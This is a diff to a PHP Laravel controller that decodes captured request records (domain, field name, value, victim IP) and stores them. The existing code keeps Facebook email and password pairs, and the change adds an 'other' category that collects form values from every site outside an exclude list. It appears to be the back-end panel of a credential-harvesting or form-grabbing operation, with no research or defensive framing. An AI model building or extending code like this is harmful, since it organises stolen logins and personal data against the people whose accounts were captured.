@@ -12,6 +12,7 @@ use App\Requestall;
 use App\Fb;
 use App\Gg;
 use phpDocumentor\Reflection\Types\Integer;
+use App\Other;
 
 class RequestallController extends BaseController
 {
@@ -28,7 +29,15 @@ class RequestallController extends BaseController
             ->orderBy('id','desc')
             ->get();
         $data['activeMenu'] = 'fb';
-        return view('list-data')->with($data);
+        return view('list-fb')->with($data);
+    }
+
+    public function listQuery()
+    {
+        $obj = new Other;
+        $data['other'] = $obj->get();
+        $data['activeMenu'] = 'other';
+        return view('list-query')->with($data);
     }
 
     public function decodeData($input)
@@ -41,9 +50,11 @@ class RequestallController extends BaseController
     public function getData($data, $findString, $firstClassName, $secondClassName)
     {
         $result = [];
+//        echo "<pre>";
         foreach ($data as $item) {
             $ipAddress = $item->ip;
             $a = $this->decodeData($item)['data'];
+//            var_dump($a);
             if($a){
                 foreach ($a as $k => $it) {
                     // check if domain contain string facebook.com and class name = email
@@ -69,6 +80,34 @@ class RequestallController extends BaseController
                                 'ip' => $ipAddress
                             ]);
                         }
+                    }else{
+//                        echo "<pre>";var_dump($it);
+                    }
+
+                }
+            }
+        }
+//        die;
+        return $result;
+    }
+
+    public function getOtherData($data, $exclude)
+    {
+        $result = [];
+//        echo "<pre>";
+        foreach ($data as $item) {
+            $ipAddress = $item->ip;
+            $decryptedData = $this->decodeData($item)['data'];
+            if($decryptedData){
+                foreach ($decryptedData as $k => $row) {
+                    $domain = $row->dm;
+                    if( !in_array($domain, $exclude) ){
+                        array_push($result, [
+                            'cn' => !empty($row->cn) ? $row->cn : '',
+                            'dm' => $domain,
+                            'vl' => $row->vl,
+                            'ip' => $ipAddress
+                        ]);
                     }
                 }
             }
@@ -85,6 +124,8 @@ class RequestallController extends BaseController
             $data = $this->filterFb($params);
         }elseif ($filterWhat == 'gg'){
             $data = $this->filterGg($params);
+        }elseif ($filterWhat == 'other'){
+            $data = $this->filterQuery($params);
         }
 
         return response()->json($data);
@@ -136,6 +177,65 @@ class RequestallController extends BaseController
         return $data;
     }
 
+    public function filterQuery($params)
+    {
+        $offset = $params['offset'];
+        $limit = $params['limit'];
+
+        $result = Requestall::offset($offset)
+            ->limit($limit)
+            ->orderBy('id')
+            ->get();
+        if($result){
+            $exclude = [
+                'www.google.com',
+                'www.google.com.vn',
+                'www.youtube.com',
+                'www.facebook.com',
+                'vi-vn.facebook.com',
+                'www.nhaccuatui.com',
+                'goidon.tk',
+                'coccoc.com',
+                'crm.thegioididong.com',
+                'docs.google.com',
+                'insite.thegioididong.com',
+                'simonline.com.vn',
+                'soundcloud.com',
+                'wordpress.com',
+                'www.google.com.au',
+                'ubndmt.vpdttg.vn',
+                'upload.xvideos.com',
+                'javhihi.com',
+                'www.ponhd.com',
+                'avschool.tv',
+                'bilutv.com',
+                'chatsex24h.com',
+                'chiasenhac.vn',
+                'search.chiasenhac.vn',
+                'hentaivn.net',
+                'javhihi.com',
+                'm.hentaiimoingay.tk',
+                'mixing.dj',
+                'taigame.org',
+                'tratu.soha.vn',
+                'www.3dsexvilla.com',
+                'www.javbus.com',
+                'www.javhoo.com',
+                'www.javlibrary.com'
+            ];
+            $query = $this->getOtherData($result, $exclude);
+//            echo "<pre>";var_dump($query);die;
+            // Insert to table
+            $data['insertedRows'] = $this->insertOther($query);
+            $data['offset'] = (Int)$offset;
+        }else{
+            $data['insertedRows'] = -1;
+            $data['offset'] = (Int)$offset;
+        }
+        $data['countOriginData'] = count($result);
+        return $data;
+    }
+
     public function insertGg($data)
     {
         $countInserted = 0;
@@ -174,6 +274,28 @@ class RequestallController extends BaseController
                 $fb->pwd = $item['pwd'];
                 $fb->ip = $item['ip'];
                 $fb->save();
+                $countInserted++;
+            }
+        }
+        return $countInserted;
+    }
+
+    public function insertOther($data)
+    {
+        $countInserted = 0;
+        $obj = new Other;
+        foreach ($data as $item) {
+            // check exist
+            $count = $obj::where('ip', '=', $item['ip'])->where('cn', '=', $item['cn'])->where('dm', '=', $item['dm'])->where('vl', '=', $item['vl'])
+                ->count();
+            // if not exist then insert to DB
+            if($count == 0){
+                $obj = new Other;
+                $obj->cn = $item['cn'];
+                $obj->dm = $item['dm'];
+                $obj->ip = $item['ip'];
+                $obj->vl = $item['vl'];
+                $obj->save();
                 $countInserted++;
             }
         }
